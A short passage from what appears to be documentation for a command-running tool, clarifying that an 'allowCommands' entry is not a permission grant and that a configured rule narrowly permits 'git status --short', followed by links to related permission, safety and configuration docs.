Remember: the `allowCommands` entry is not an allowlist and is not the permission grant. The configured permission
rule is what narrowly allows `git status --short` for the named local surfaces.

## Further Reading

- [Command analysis and policy matching plan](../.plan/command-analysis-and-policy-matching.md)
- [Permissions](../website/docs/docs/concepts/permissions.md)
- [Safety and guardrails](../website/docs/docs/concepts/safety-and-guardrails.md)
- [Tools](../website/docs/docs/concepts/tools.md)
- [Configuration reference](../website/docs/docs/reference/config.md)
- [CLI reference](../website/docs/docs/reference/cli.md)
- [Trace events](../website/docs/docs/reference/trace-events.md)
